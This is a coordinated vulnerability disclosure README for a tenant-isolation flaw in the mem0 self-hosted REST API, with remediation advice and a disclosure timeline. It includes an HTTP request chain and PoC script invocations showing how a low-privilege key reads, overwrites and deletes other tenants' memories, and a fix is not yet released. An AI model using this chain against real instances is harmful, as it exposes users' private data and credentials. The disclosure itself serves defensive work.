# mem0 — Broken Tenant Isolation in Self-Hosted REST API

Coordinated vulnerability disclosure for the mem0 open-source memory layer.

Any authenticated API key — including a low-privilege `role=user` key — can enumerate
every tenant namespace on a shared instance and read, overwrite, or delete other
tenants' memories. Only the unfiltered `GET /memories` listing is role-gated; supplying
`?user_id=<victim>` bypasses it.

| ID | Severity | CVSS 3.1 | CWE |
|----|----------|----------|-----|
| MEM0-2026-01 | High | 8.8 | CWE-639 |
| MEM0-2026-02 | Medium | 4.3 | CWE-200 |
| MEM0-2026-03 | Low | 4.3 | CWE-770 |

Detailed advisory: [`advisory/2026-11-18-mem0-tenant-isolation.md`](advisory/2026-11-18-mem0-tenant-isolation.md)
Full assessment report with raw evidence: [`report.md`](report.md)

## Affected

- mem0 OSS `server/` REST API (`mem0ai 2.2.1`), commit `f1791da`
- Configuration: `AUTH_DISABLED=false`, more than one principal sharing the instance
- Fixed-in: **unreleased** — watch the upstream repository

## Proven chain (low-privilege key)

```http
GET /entities                                    -> 200  lists every user_id/agent_id/run_id
GET /memories?user_id=alice_tenant               -> 200  victim memory (PII, credentials)
GET /memories/1bd03115-...                       -> 200  full record
GET /memories/1bd03115-.../history               -> 200  mutation history
POST /search {"filters":{"user_id":"alice_tenant"},"threshold":0} -> 200
PUT /memories/{id} {"text":"overwritten"}        -> 200
DELETE /memories/{id}                            -> 200
GET /memories (no identifier)                    -> 403  <- gate exists, bypassed above
GET /configure                                   -> 200  internal DB host/port/user
```

## Reproduce locally

```bash
# 0. clone the mem0 source somewhere
git clone https://github.com/mem0ai/mem0.git ~/src/mem0

# 1. bring up pgvector + venv + stub OpenAI + server + two principals
MEM0_SRC=~/src/mem0 ./poc/setup_local.sh

# 2. run the cross-tenant proof with the low-privilege key it prints
BASE=http://127.0.0.1:8000 KEY=<keyB> VICTIM=alice_tenant ./poc/poc_cross_tenant.sh
```

`setup_local.sh` seeds a victim namespace (`alice_tenant`) and a second tenant
(`bob_tenant`), provisions an operator-created `role=user` account, and prints both keys.
Everything is local, synthetic, and disposable — `docker compose down -v` cleans up.

## Disclosure timeline

| Date (UTC) | Event |
|---|---|
| 2026-11-18 | Findings reproduced against commit `f1791da`, report + PoC captured |
| 2026-11-18 | Repository published; maintainers notified |
| 2026-12-18 | Planned follow-up if no response |
| 2027-02-16 | Planned public disclosure (90 days) |

## Remediation (short)

1. Bind `user_id`/`agent_id`/`run_id` to the authenticated principal server-side; reject mismatches.
2. Add ownership checks to `GET/PUT/DELETE /memories/{id}` and `/history`; scope `/search` the same way.
3. Restrict `GET /entities` and `GET /configure` to `require_admin`; redact config keys by substring.
4. Rate-limit memory routes and replace the 10k-row `/entities` scan with a `DISTINCT` query.

## License

MIT — see [`LICENSE`](LICENSE). PoC and report provided for defensive and remediation purposes.
